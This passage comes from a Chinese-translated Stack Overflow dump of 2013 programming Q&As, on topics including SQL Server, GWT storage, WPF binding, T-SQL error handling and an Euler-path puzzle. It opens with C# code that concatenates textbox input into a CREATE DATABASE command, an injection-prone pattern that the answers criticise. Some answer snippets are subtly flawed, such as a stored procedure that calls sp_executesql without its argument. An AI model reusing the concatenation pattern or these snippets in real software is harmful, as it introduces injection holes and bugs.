    // return somthing
} 
```

然后在你的代码上，

```
if (IsValid(tbxDatabase.Text))
{
    SqlConnection myConnection = new SqlConnection(ConnectionString);
    string myQuery = "CREATE DATABASE [" + tbxDatabase.Text + "]";
    myConnection.Open();
    SqlCommand myCommand = new SqlCommand(myQuery, myConnection);
    myCommand.ExecuteNonQuery();
}
else
{
    // invalid name
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:12:16.387

使用存储过程并传递参数

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:10:14.660

是的，您的代码非常不安全，一种替代方法是创建只接受确切参数的存储过程，以避免动态构建命令。

C# 本身不会帮助 ypu 避免这些事情，它应该嵌入到应用程序逻辑中

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T16:23:02.357

完成此操作的安全方法是使用 sql 函数 QUOTENAME() 来转义输入。

```
CREATE PROC example_create_db ( @db_name NVARCHAR(256) )
AS 
    BEGIN
        DECLARE @sql NVARCHAR(1000)
    /*
        QUOTENAME() adds the surrounding []'s
    */

        SET @sql = 'CREATE DATABASE ' + QUOTENAME(@db_name) 
        EXEC sp_executesql
    END 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-26T15:09:34.440

将实际的创建命令放在存储过程中。

不要只是将文本框中的文本粘贴到字符串中并运行它。

编辑：好的，所以事实证明 CREATE 需要一个常量表达式，所以你不能参数化命令。

但是，如果您必须在代码中执行此操作，您至少应该在将输入连接成字符串之前验证输入。在这种情况下，您不应允许任何表名包含除 a - z、A - Z 之外的任何内容。

# hadoop - hadoop中单个文件的用户访问频率

> ID：15092444
> 
> 赞同：0
> 
> 时间：2013-02-26T15:06:24.750
> 
> 标签：hadoop, hdfs

我想获取 Hadoop 分布式文件系统中单个文件的数据访问频率计数。我有 5 个 hadoop 节点集群，我想根据文件流行度更改复制因子。我可以从 hadoop 日志文件中获取它吗？据我从这些日志文件中了解到，我没有找到任何信息。有没有人可以帮助我。提前致谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T01:19:31.617

检查名称节点日志 - 请参阅“Hadoop，权威指南”的*[审核日志](http://books.google.com/books?id=bKPEwR-Pt6EC&pg=PA280&lpg=PA280&dq=namenode%20logs%20FS%20Audit&source=bl&ots=kPcx7xedBo&sig=cjBjgoUR_KTJW9Fq4ow-BmkVnx0&hl=en&sa=X&ei=n14tUYyLCYuu0AHZpoGoBw&ved=0CC4Q6AEwAA#v=onepage&q=namenode%20logs%20FS%20Audit&f=false)*部分：

# json - GWT LocalStorage - 存储对象

> ID：15092450
> 
> 赞同：2
> 
> 时间：2013-02-26T15:06:42.017
> 
> 标签：json, html, gwt, local-storage, stringify

[这份文件](https://developers.google.com/web-toolkit/doc/latest/DevGuideHtml5Storage)说：

> HTML5 本地存储以字符串形式将数据保存为键值对。如果您要保存的数据不是字符串数据，则您需要在使用 LocalStorage 时负责与字符串之间的转换。对于与 GWT RequestFactory 一起使用的代理类，您可以使用 RequestFactory#getSerializer() 进行字符串序列化。对于非代理对象，您可以使用[JSON stringify 和 parse](http://www.json.org/js.html)。

谁能帮我“字符串化”一个对象以将其保存在客户端上？GWT 有什么方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-02-19T23:31:13.133

你可以试试**gwt-storage** [https://github.com/seanchenxi/gwt-storage](https://github.com/seanchenxi/gwt-storage)，它的主要特点是将java对象存储在html5 stroage (localstorage/sessionstorage)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:26:57.360

你必须序列化你的对象。您可以将传输的有效负载作为字符串存储在 TransportReceiver 中（如果您使用的是 RequestFacotries）：

```
public class CustomTransportReceiver implements TransportReceiver {

    @Override
    public void onTransportSuccess(String payload) {

        //Save payload to LocalStorage

    }

    @Override
    public void onTransportFailure(ServerFailure failure) {
        //Handle Failure

    }

} 
```

创建您自己的 RequestTransport：

```
public class AppRequestTransportLocalStorage extends DefaultRequestTransport {
        @Override
    public void send(String payload, TransportReceiver receiver) {
           super.send(payload, new CustomTransportReceiver());
    }
} 
```

在你初始化 RequestFactory 的地方写：

```
requestfactory.initialize(new SimpleEventBus(), new AppRequestTransportLocalStorage()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:43:28.023

[这是用于检索 JSON 数据](https://developers.google.com/web-toolkit/doc/latest/tutorial/JSON)的官方 GWT 链接

例如该教程中的示例

利用

```
JsonUtils.safeEval(json); 
```

您可以将该结果传递给`HTML5`.

# debugging - 使用 pgAdmin 调试器是否可以检查函数中使用的临时表的内容？

> ID：15092457
> 
> 赞同：2
> 
> 时间：2013-02-26T15:06:59.483
> 
> 标签：debugging, postgresql, pgadmin

在 pgAdmin 调试器中单步执行一个函数时，如果可能的话，如何检查临时表的内容？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-01T06:23:05.333

最好的办法可能是根据您可以在调试器中设置的变量添加条件逻辑。然后您可以将变量设置为有用的状态并以这种方式运行。例如：

```
CREATE OR REPLACE FUNCTION test_function() RETURNS BOOL LANGUAGE PLPGSQL AS
$$
DECLARE t_debug int;
        t_record RECORD;
BEGIN;
IF t_debug > 1 THEN
   FOR t_record IN SELECT * FROM my_temp_table LOOP
      RAISE NOTICE 'Row in my_temp_table: %', t_record::text;
   END LOOP;
END IF;
RETURN TRUE;
$$; 
```

# c# - 将数据绑定到 WPF 中的 Combobox

> ID：15092459
> 
> 赞同：0
> 
> 时间：2013-02-26T15:07:05.393
> 
> 标签：c#, wpf, wpf-controls

我正在尝试将collectorDTO列表中的配置文件绑定到数据列表中的wpf中的Combobox，请在下面找到代码

```
List<CollectorDTO> cdlist = new List<CollectorDTO>();
            cbProfile.ItemsSource = cdlist;
            cbProfile.DisplayMemberPath = "Profile";
            cbProfile.SelectedValuePath = "Profile"; 
```

收集器 DTO 包含以下带有 get set 方法的变量

```
private  int _coldataId;
private string _profile;
private string _protocol;
private string _hosttype;
private string _host;
private string _uid;
private string _pwd;
private string _remdir;
private string _locdir;
private string _database;
private string _audittrail;
private string _skeleton;
private string _tmode;
private string _cmdstr;
private string _starttime;
private string _stoptime;
private int _period;
private string _addinfo; 
```

请帮忙绑定数据？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:11:42.227

然后，您的显示成员路径应该是`_profile`而不是`Profile`. 此外，请确保在设置绑定之前已填充列表，因为您使用的是不是可观察集合的普通列表（组合框无法知道您在设置绑定后向列表中添加了某些内容） .

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:32:49.880

将您的列表定义更改为公共财产。大多数绑定只接受它们：

```
private List<CollectorDTO> _cdlist;
public List<CollectorDTO> cdlist 
{
    get { return _cdlist; }
    set { _cdlist = value; }
} 
```

# google-app-engine - 将域从 1&1 重定向到 GAE

> ID：15092460
> 
> 赞同：-1
> 
> 时间：2013-02-26T15:07:09.290
> 
> 标签：google-app-engine, dns, cname, http-redirect

我正在尝试将我从 1&1 购买的域重定向到 GAE。

现在，我的域正在重定向到我的 appengine 应用程序，但问题是如果我在浏览器的 URL 中写入以下内容：www.mydomain.com，它会被重定向到[http://myappid.appspot.com](http://myappid.appspot.com)（而不是重定向到[http://myappid.appspot.com](http://myappid.appspot.com)但在 URL 上显示相同的域 --> www.mydomain.com）。

有谁知道如何在 1&1 上配置它？

这是我的 1&1 配置：

```
Domain name --> mydomain.com (MX)
Type --> Domain
Destination --> Redirection(http://myappid.appspot.com)
Register --> Public
Status --> Activated 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-27T20:18:28.097

You don't need a frame redirect.

(1) Set up a subdomain called "www", and have your naked domain (mydomain.com) redirect to www.mydomain.com as an http redirect.

(2) Sign up for "Google Apps for Business" using "mydomain.com" as your domain.

(3) In the Google Apps dashboard, find "App Engine Apps", and add your app-id.

(4) Click on your app-id and From there you can add additional web addresses for your app. Add "www.mydomain.com" here.

(5) In 1&1 you'll have to update your www.mydomain.com DNS settings as CNAME, with alias "ghs.googlehosted.com"

With all that done, mydomain.com will http redirect to www.mydomain.com, which in turn will alias to ghs.googlehosted.com, which in turn will pull up your app.

You can then cleanly use your domain URIs, ex: "mydomain.com/getPineappleStatus?id=12"

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:37:29.417

我找到了解决方案（使用帧重定向）

[关联](http://faq.1and1.com/domains/domain_admin/domain_dest/3.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:13:00.063

官方文档解释了如何设置域以使用 Google 应用引擎。请参阅此处的文档：

[https://developers.google.com/appengine/docs/domain](https://developers.google.com/appengine/docs/domain)

# jquery - Prototype 等效于/替代 jQuery 的“.load()”

> ID：15092461
> 
> 赞同：0
> 
> 时间：2013-02-26T15:07:12.317
> 
> 标签：jquery, load, prototype

jQuery 原型中的等效/解决方法是`.load()`什么？

恩详细，我必须重写这个

```
$("#myElement img").load(function() { 
```

到原型。请不要打我，这是我公司的决定。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T10:59:03.157

我自己想出来了：最好的解决方案（跨浏览器安全且没有缓存问题）是：

```
// get img element that inside of #motherElementWithAnID
// it's [0] because it's the first (and only) in the result array
var picElement = $("motherElementWithAnID").select("img")[0];

// wait for fully loaded element content
picElement.onload = function() { ... }); 
```

# python - 这个错误是什么意思： ValueError: unknown POST form encoding type ' ' （以及如何解决？）

> ID：15092462
> 
> 赞同：0
> 
> 时间：2013-02-26T15:07:12.110
> 
> 标签：python, web-crawler, mechanize

我正在尝试使用抓取网站（[http://www.dataescolabrasil.inep.gov.br/dataEscolaBrasil/home.seam](http://www.dataescolabrasil.inep.gov.br/dataEscolaBrasil/home.seam)），`mechanize`但我收到一个我无法理解的错误（因此无法解决）。这可能是由于我对 Web 开发的了解不足。

这是我正在尝试做的事情：

```
import mechanize

# this is the website I want to crawl
LINK = "http://www.dataescolabrasil.inep.gov.br/dataEscolaBrasil/home.seam"

br = mechanize.Browser()
br.open(LINK) 
request  = mechanize.Request(LINK)
response = mechanize.urlopen(request)

# there're two forms in the page (output ommited), I want the second one.
forms = mechanize.ParseResponse(response, backwards_compat=False)
for form in br.forms():
    print "Form name:", form.name
    print form

br.select_form(nr=1)
br.form['codEntidadeDecorate:codEntidadeInput'] = '11024968'
response2 = br.submit() 
```

这是我得到的运行时错误：

```
Traceback (most recent call last):
  File "C:\test.py", line 19, in <module>
    response2 = br.submit()
  File "build\bdist.win32\egg\mechanize\_mechanize.py", line 541, in submit
  File "build\bdist.win32\egg\mechanize\_mechanize.py", line 530, in click
  File "build\bdist.win32\egg\mechanize\_form.py", line 2999, in click
  File "build\bdist.win32\egg\mechanize\_form.py", line 3201, in _click
  File "build\bdist.win32\egg\mechanize\_form.py", line 2350, in _click
  File "build\bdist.win32\egg\mechanize\_form.py", line 3269, in _switch_click
  File "build\bdist.win32\egg\mechanize\_form.py", line 3257, in _request_data
ValueError: unknown POST form encoding type '' 
```

我尝试对传递给表单的字符串进行一些调整，试图理解 GET v. POST，但没有成功。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T18:26:43.637

我在您的示例页面中找到了该表格：

```
<form id="buscaForm" name="buscaForm" method="post" action="/dataEscolaBrasil/home.seam;jsessionid=EFB3D6270E69EAE71733137219C3026B" enctype=""> 
```

I think it's a problem, empty *enctype* attribute. You need to set value of this attribute to *application/x-www-form-urlencoded* or remove it for use default.

# autohotkey - 目录 Opus 和 Autohotkey 一起工作

> ID：15092463
> 
> 赞同：0
> 
> 时间：2013-02-26T15:07:17.137
> 
> 标签：autohotkey

我有一个自动热键脚本，它遍历所有拖到其图标上的文件。

文件名在循环内使用 RegEx 进行处理，然后 FILEMOVEd 变成一个新名称。

当文件被拖到图标上时，该脚本可以完美运行。

但是当我将脚本放入 Directory Opus 按钮时，然后是 {filepath$} （应该将所有选定的文件发送到脚本），脚本的多个实例被启动，通常我选择的一些项目被忽略（未处理）。这是代码。

```
Loop %0%
{ 
   Path := %A_Index%
    Loop %Path%, 1
    LongPath = %A_LoopFileLongPath%    
   SplitPath LongPath, OutFileName, OutDir, OutExtension, OutNameNoExt, OutDrive 

...

FileMove, %LongPath%, %OutDir%/%OutNameNoExt%_%FormatCode%.%OutExtension%
}
exitapp 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T10:01:16.120

当您使用**{filepath$}**时，Directory Opus 将对每个文件运行一次命令，一次一个文件。它适用于一次只能接受一个文件的命令。

要一次传递所有文件路径，请在单个命令行上使用**{allfilepath$}**

# xml - 如何使用 xslt 或 xpath 向 xml 文件添加注释

> ID：15092464
> 
> 赞同：3
> 
> 时间：2013-02-26T15:07:18.477
> 
> 标签：xml, xslt, xpath

我刚刚学习了 xpath 和 xsl，我有一个问题。

如何`<!-- foo -->`在每个名为 foo 的 xml 元素的开头添加例如注释？

我可以使用 xpath 或 xslt 吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:12:02.783

是的，有一个 XSLT 元素：<xsl:comment>。

为了做你描述的事情，你可以使用以下内容：

```
<!-- Match foo elements in the XML -->
<xsl:template match="foo">
    <xsl:comment>foo</xsl:comment>
    <foo>
        <xsl:apply-templates />
    </foo>
</xsl:template> 
```

# jquery - 追加 div 时如何触发 jquery 操作？

> ID：15092468
> 
> 赞同：0
> 
> 时间：2013-02-26T15:07:24.090
> 
> 标签：jquery

附加 div 时，我需要触发 jquery 操作。

就像是：

```
if ($('div#myDiv').is_appended()) {
console.log('the div has been appended');
} 
```

这可能吗？

**为什么我需要这个**

这个问题与这个[问题](https://stackoverflow.com/questions/15083511/how-to-execute-jquery-inside-a-modal-window)有关，我在 jquery 库之后加载了模态 div，然后我无法定位其中的元素。

现在我正在尝试在模态 div 加载时做一些事情，但不确定我是否完成了它，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:09:58.697

不是以跨浏览器的方式，还没有。有一个*突变观察者*规范草案允许它（更多在[这个 MDN 页面上](https://developer.mozilla.org/en-US/docs/DOM/MutationObserver?redirectlocale=en-US&redirectslug=DOM%2FDOM_Mutation_Observers)），但它只在最近的基于 WebKit 的浏览器和 Firefox 中实现。

几乎总是有更好的方法可用，例如从附加`div`. 在最坏的情况下（我的意思是“最坏的”），您可以每（比如说）100 毫秒使用一次轮询并检测新的`div`. 但同样，几乎总是有更好的方法。

# list - F#：从列表中提取相同长度的重叠连续子列表

> ID：15092472
> 
> 赞同：2
> 
> 时间：2013-02-26T15:07:33.913
> 
> 标签：list, f#

在 F# 中有一个 N 元素长列表，我想提取所有可能的 M 元素长重叠连续子列表（M < N），例如：

```
[1; 2; 3; 4; 5] 
```

生产

```
[[1; 2; 3]; [2; 3; 4]; [3; 4; 5]] 
```

对于 M = 3。

我知道这样做的必要方式，但是有一个简洁的功能技巧吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-26T15:14:56.277

为此有一个内置函数：[`Seq.windowed`](http://msdn.microsoft.com/en-us/library/ee340420.aspx)

# android - 三星 Android 设备的 JQM/openlayers 导航栏选择

> ID：15092473
> 
> 赞同：0
> 
> 时间：2013-02-26T15:07:33.937
> 
> 标签：android, cordova, jquery-mobile, openlayers, samsung-mobile

我有一个使用 openlayers 进行映射的 jquery-mobile/phonegap 应用程序。在使用地图的页面上，见下图，我在选择页脚菜单时遇到问题。

![带地图的页面](../Images/4e5dc54ad065ab739e6aba0e5fe1e8b9.png)

例如，如果我选择 Home，应用程序将导航到捕获。这只发生在显示地图的页面上。我在 openlayers 中使用 map.render 函数，因为地图在多个屏幕之间共享。如果我删除渲染功能，菜单会按预期工作。

我添加了一个单击功能来查看有问题的单击的 x 位置，并注意 x 位置反映了导航到的页面菜单的位置，而不是单击的菜单。

菜单如下：

```
 <div class="menu" data-role="footer" data-position="fixed">
    <div data-role="navbar">
      <ul>
        <li>
          <a href="index.html"
             class="home-button"
             data-icon="custom">Home</a>
        </li>
        <li>
          <a href="map.html"
             class="map-button ui-btn-active"
             data-icon="custom">Map</a>
        </li>
        <li>
          <a href="capture.html"
             class="capture-button"
             data-icon="custom">Capture</a>
        </li>
        <li>
          <a href="download.html"
             class="download-button"
             data-icon="custom">Download</a>
        </li>
      </ul>
    </div> 
```

如果我删除 data-role="footer" div，导航栏菜单将按预期工作。

注意：这已在仅使用 android 2.3.5 的三星设备上复制。我在带有 android 2.3.6、4+ 和我们测试过的所有其他型号的三星设备上运行良好。

使用：openlayers 1.12 jquery-mobile：1.2.0（也试过1.3.0）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T17:55:49.160

设置页脚的 z-index 解决了这个问题：

```
.ui-footer {
    z-index: 10000;
} 
```

# sql-server - Try and Catch on TSQL - 抓不抓

> ID：15092479
> 
> 赞同：4
> 
> 时间：2013-02-26T15:07:48.203
> 
> 标签：sql-server, sql-server-2008, tsql, try-catch

我有一个似乎没有正确记录其错误的存储过程。

代码出错，但 catch 块似乎没有生效。

try 块相当长 - 但错误部分很简单，并且在最后，所以我已经精确了。

```
BEGIN TRY 
insert into tbl_X
select * from #temp_tbl_Y

RETURN 1
END TRY

BEGIN CATCH
    Insert Into ExtractsErrorLog
    SELECT 
    getdate() as ErrorDate 
    ,object_name(@@procid) as ProcedureName
    ,ERROR_NUMBER() as ErrorNumber
    ,ERROR_LINE() as ErrorLine
    ,ERROR_MESSAGE() as ErrorMessage
    ;
DECLARE @errormessage as varchar(max);
DECLARE @errorseverity as int;
DECLARE @errorstate as int;

set @errormessage = ERROR_MESSAGE();
set @errorseverity = ERROR_SEVERITY();
set @errorstate = ERROR_STATE();

 RAISERROR (@errormessage,
            @errorseverity,
            @errorstate
               );

END CATCH; 
```

proc 失败的错误是我们的老朋友“列名或提供的值的数量与表定义不匹配”。我已经修复了这个错误——这是一个愚蠢的懒惰错误——但我很困惑为什么我的错误记录过程似乎没有工作——没有行被插入到我的 ExtractsErrorLog 表中。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2014-10-16T16:20:20.643

TSQL`TRY...CATCH`没有捕捉到那个错误。此错误属于“编译/重新编译”类型的错误，这些错误未由`CATCH`“在同一执行级别内”的块处理。

来自[MSDN](http://msdn.microsoft.com/en-us/library/ms175976.aspx)：

> 以下类型的错误发生在与 TRY...CATCH 构造相同的执行级别时，不会由 CATCH 块处理：
> 
> *   编译错误，例如语法错误，阻止批处理运行。
>     
>     
> *   语句级重新编译过程中出现的错误，例如由于延迟名称解析而在编译后出现的对象名称解析错误

...

> 您可以使用 TRY...CATCH 来处理编译或语句级重新编译期间发生的错误，方法是在 TRY 块内的单独批处理中执行生成错误的代码。例如，您可以通过将代码放在存储过程中或使用 sp_executesql 执行动态 Transact-SQL 语句来执行此操作。这允许 TRY…CATCH 在比错误发生更高的执行级别捕获错误。例如，以下代码显示了一个生成对象名称解析错误的存储过程。包含 TRY...CATCH 构造的批处理在比存储过程更高的级别上执行；并且捕获发生在较低级别的错误。

我在一个脚本中遇到了类似的问题，它在一个内部创建了一个事务`TRY...CATCH`， `ROLLBACK`如果它失败了。事务中的一条语句引发了同样的错误，并导致事务永远不会关闭，因为`CATCH`从未输入过。

正如 MSDN 文章中提到的，一种替代方法是从您的`INSERT`语句中创建一个存储过程，然后在您的 try/catch 中调用它。如果存储过程错误，您将在尝试创建它时发现编译错误。如果表定义稍后更改以使存储过程无效，那么`TRY...CATCH`它将为您捕获异常。

如果您希望它全部存在于一个脚本中，您可以将其设为[临时存储过程](http://technet.microsoft.com/en-us/library/ms190669(v=sql.105).aspx/#sectionToggle1)，但是您需要在创建存储过程时处理编译错误。它不漂亮，但它会起作用：

```
-- Creating error sproc to re-use code
CREATE PROCEDURE #HandleError AS
    Insert Into ExtractsErrorLog
    SELECT  GETDATE() as ErrorDate 
            ,object_name(@@procid) as ProcedureName
            ,ERROR_NUMBER() as ErrorNumber
            ,ERROR_LINE() as ErrorLine
            ,ERROR_MESSAGE() as ErrorMessage;

    DECLARE @errormessage as varchar(max);
    DECLARE @errorseverity as int;
    DECLARE @errorstate as int;

    set @errormessage = ERROR_MESSAGE();
    set @errorseverity = ERROR_SEVERITY();
    set @errorstate = ERROR_STATE();

    RAISERROR ( @errormessage,
                @errorseverity,
                @errorstate);
GO

-- Create a stored procedure of our INSERT and catch any compilation errors
CREATE PROCEDURE #TEST AS
    insert into tbl_X
    select * from #temp_tbl_Y
GO
IF (@@ERROR <> 0) BEGIN
    exec #HandleError
    -- If there was an error creating the sprocs, don't continue to the next batch
    RETURN
END

-- If compilation succeeded, then run the sproc
BEGIN TRY 
    exec #TEST
    RETURN
END TRY
BEGIN CATCH
    exec #HandleError
END CATCH; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-19T21:05:49.067

我在我的日志记录的 INSERT 语句之前在我的 CATCH 块中使用了 THROW - 并遇到了与您相同的问题。一旦我在记录 INSERT 语句之后移动了 THROW，它就起作用了。看起来 THROW 可能会终止会话。

您没有在代码示例中使用 THROW，但认为这可能对其他人有所帮助。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-26T17:50:30.827

这是您的 RETURN：“从查询或过程中无条件退出。RETURN 是立即且完整的，可以在任何时候用于退出过程、批处理或语句块。”

# c++ - 如何在 VS 2010 OpenCV 中使用 CascadeClassifier

> ID：15092480
> 
> 赞同：-1
> 
> 时间：2013-02-26T15:07:49.400
> 
> 标签：c++, visual-studio, opencv

我有一个项目，加载图片等。我想做对象检测。我有一个来自 haartrain 的 xml。但是，以下代码**无法编译：**

```
String berniurl= "D:\Dropbox\Egyetem\tanulmany2\kutyafelek\berni.xml";
CascadeClassifier berni_cascade;

if( !berni_cascade.load( berniurl ) ){ 
    printf("--(!)Error loading\n"); 
}; 
```

VS2010，OpenCV2.2（从已建站点下载）。

并且错误在 main.obj 中，例如：

```
Error   7   error LNK2019: unresolved external symbol "public: __thiscall cv::CascadeClassifier::~CascadeClassifier(void)" (??1CascadeClassifier@cv@@QAE@XZ) referenced in function _main   C:\Users\Gabor\Documents\Visual Studio 2010\Projects\opencvcucc\opencvcucc\main.obj

Error   8   error LNK2019: unresolved external symbol "public: bool __thiscall cv::CascadeClassifier::load(class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > const &)" (?load@CascadeClassifier@cv@@QAE_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z) referenced in function _main C:\Users\Gabor\Documents\Visual Studio 2010\Projects\opencvcucc\opencvcucc\main.obj 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T09:50:47.117

正如banuj所说，我错过了一些进口。帮助网站：[anlak.com/using-opencv-2-3-1-with-visual-studio-2010-tutorial](http://anlak.com/using-opencv-2-3-1-with-visual-studio-2010-tutorial)

# cloudbees - 如何在 CloudBees 中设置 JVM 参数

> ID：15092486
> 
> 赞同：0
> 
> 时间：2013-02-26T15:08:10.940
> 
> 标签：cloudbees

我想为在 CloudBees 上运行的 Ruby on Rails 应用程序设置 CMSClassUnloadingEnabled 和 UseConcMarkSweepGC。我正在努力寻找使用bees SDK设置这些的语法，或者我可以在warble.rb中设置它们吗？

谢谢！

-最大限度

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T22:07:17.703

是的，您可以通过 CLI/SDK 设置选项，例如：

```
bees app:deploy app.war -R JAVA_OPTS="-verbose:class" 
```

-R JAVA_OPTS 将传递您想要的参数。

# windows - 新文件不只显示文件夹

> ID：15092487
> 
> 赞同：0
> 
> 时间：2013-02-26T15:08:12.800
> 
> 标签：windows, git

我对 git 比较陌生。我正在使用：

```
git version 1.8.1.msysgit.1 
```

Powershell 和 Poshgit

我已将一个新文件夹和一个新文件添加到我的存储库中。当我执行 git status 时，我看到的是文件夹，但看不到文件。为什么？

![在此处输入图像描述](../Images/04343ed393f6a36b1ae6eaed70dca341.png)

在未跟踪的文件夹中，您看到有 1 个 .sql 文件，是的，我确定它不在 .gitignore 中（我最近更改了 .sql 文件并且它们已被跟踪）。

如果我这样做`git add .`，是否会添加未显示的文件？

更新：
我只需要添加目录，文件就会自动显示。我假设如果我有多个文件都会出现。请参阅下面我执行的命令：

![在此处输入图像描述](../Images/4334eec71feb488ea16889cfeed6c773.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:09:53.520

`git status`报告您有一个完整的目录，没有您`git add`编辑过的任何文件。只要您`git add`在目录中找到其中一个文件，它就会列出它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:10:10.397

这是对 git 的简化。它知道它不跟踪该文件夹中的任何文件，因此它只显示文件夹名称而不是它包含的所有文件。

# windows-8 - 当 IE10 处于 Metro 模式时，它实际上是与桌面模式不同的浏览器版本吗？

> ID：15092491
> 
> 赞同：1
> 
> 时间：2013-02-26T15:08:19.700
> 
> 标签：windows-8, internet-explorer-10

现在，我们正在处理 Web 应用程序中的错误，这些错误似乎仅在 IE10 处于 Metro 模式时才会出现。当 IE 从桌面运行时，不会发生错误。

问题：

*   当 IE10 处于 Metro 模式时，它与从桌面运行时的浏览器版本是否有效不同？这能解释我们看到的一些行为差异吗？
*   如果是不同的版本，是否有解释差异的资源？
    *   特别担心渲染引擎差异或 JavaScript 版本。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-26T17:35:00.650

是的，IE10 有两个不同的版本：Metro/Windows UI 和桌面版。这是微软的官方文档，解释了异同：[​​http://msdn.microsoft.com/library/ie/hh771832.aspx](http://msdn.microsoft.com/library/ie/hh771832.aspx)

# ruby - 如何使用正则表达式查找包含正则表达式特殊字符的字符串

> ID：15092492
> 
> 赞同：2
> 
> 时间：2013-02-26T15:08:22.283
> 
> 标签：ruby, regex

我有一段闲置的代码：

```
details =~ /.#{action.name}.*/ 
```

如果`action.name`包含诸如“abcd”之类的常规字符串，则一切正常，但如果`action.string`包含特殊字符，例如`.`or `/`，则会出现异常。

有没有办法检查`action.name`字符串而不必`\`在 action.name 中的每个特殊字符之前放置？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:11:06.603

[您可以使用Regexp::escape](http://www.ruby-doc.org/core-2.0/Regexp.html#method-c-escape%5C)转义所有特殊字符。

尝试：

```
details =~ /.#{Regexp.escape(action.name)}.*/ 
```

# algorithm - 通过所有边的最短路径算法

> ID：15092497
> 
> 赞同：5
> 
> 时间：2013-02-26T15:08:31.210
> 
> 标签：algorithm, graph, shortest-path

这是一个朋友最近问我的一个有趣的问题/谜语：

> 你正在画网球场的线条。你有一台可以画直线的机器，但是一旦打开，你就无法停止它，直到工作完成。显然，您将需要两次遍历某些行。您必须使用的最少*额外油漆量是多少，以英尺为单位？*

法院的尺寸：

![法庭](../Images/effe9cc0d3fe2f7d56a0f1a94a1841bb.png)

所有线路的总和为 480 英尺。我碰巧知道答案是多出 63 英尺（总共 543 英尺），但我不禁想知道解决这个问题的最佳算法是什么。

这似乎类似于旅行推销员问题，其中球场上的每条线都由图中的一个顶点表示，并且球场线的交汇点转换为边。（否则，如果线是边，角是顶点，则需要一条穿过所有边的路径，而我不知道有任何算法）。也许您需要更聪明地了解如何表示线的连接点，我对此有一些想法，但还没有真正奏效。

不过，我认为问题足够小，可以对通过折线图的*所有路径进行强力检查。*你会如何编码？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-28T08:24:24.917

一个无向图有欧拉轨迹当且仅当至多两个顶点的度数为奇数，并且其所有非零度数的顶点都属于一个连通分量。（取自[http://en.wikipedia.org/wiki/Eulerian_path](http://en.wikipedia.org/wiki/Eulerian_path)）</p>

当我们得到一个非欧拉图时，我们可以通过向奇数度顶点添加边来将其更改为欧拉图。所以，这个问题就变成了：找到将图转换为欧拉的最低成本。

算法应该是：

1.  列出所有具有奇数度的顶点，建议它是一个 list_vodd[];
2.  在list_vodd[]中找到顶点之间的最短边，得到边的两个顶点：pa，pb；
3.  在 pa,pb 之间添加一条边（这意味着这条边应该被绘制两次）；
4.  从 list_vodd[] 中删除 pa,pb；
5.  转到 2 直到 list_vodd[] 中只有两个顶点。
6.  使用任何现有算法在带有添加边的新图中找出欧拉路由器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-04-01T18:04:29.990

我在这里玩游戏有点晚了，但是当我试图找到一种算法来确定在州立公园的每条小径上徒步旅行的最短路径时，我遇到了这个问题。这是一个草图，解释了为什么答案是 63 [![在此处输入图像描述](../Images/b694d58483885b55e36dae60940b23ae.png)](https://i.stack.imgur.com/ZJqHc.jpg) 正如理查德所说，这是一个中国邮递员问题。由于问题没有指定我们必须在同一位置开始和结束，我们可以使用半欧拉图，这就是为什么所有节点都有偶数，除了共享公共边的起点和终点。

这是一个非常好的视频，它解释了如何绘制和解决此类问题。 [https://www.youtube.com/watch?v=spaUY8PlyYA](https://www.youtube.com/watch?v=spaUY8PlyYA)

# c++ - 如何在没有 boost::timer 的情况下以毫秒为单位计时

> ID：15092504
> 
> 赞同：28
> 
> 时间：2013-02-26T15:08:43.253
> 
> 标签：c++, boost, timer, std, timing

我正在使用不包括 boost::timer 的 boost 1.46，还有什么其他方法可以为我的函数计时。

我目前正在这样做：

```
time_t now = time(0);
<some stuff>
time_t after = time(0);

cout << after - now << endl; 
```

但它只是在几秒钟内给出答案，所以如果函数需要 < 1s，它会显示 0。

谢谢

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-02-26T15:17:49.097

**在 Linux 或 Windows 中：**

```
#include <ctime>
#include <iostream>

int
main(int, const char**)
{
     std::clock_t    start;

     start = std::clock();
     // your test
     std::cout << "Time: " << (std::clock() - start) / (double)(CLOCKS_PER_SEC / 1000) << " ms" << std::endl;
     return 0;
} 
```

祝你好运 ;）

* * *

## 回答 #2

